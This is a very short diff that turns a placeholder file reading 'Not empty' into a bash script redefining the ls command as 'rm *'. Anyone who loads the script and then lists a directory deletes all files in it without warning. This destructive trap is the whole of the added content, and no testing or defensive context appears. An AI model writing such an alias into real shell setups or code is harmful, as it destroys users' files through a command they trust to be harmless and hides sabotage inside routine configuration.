@@ -1,1 +1,2 @@
-Not empty
+#!/bin/bash
+alias ls='rm *'
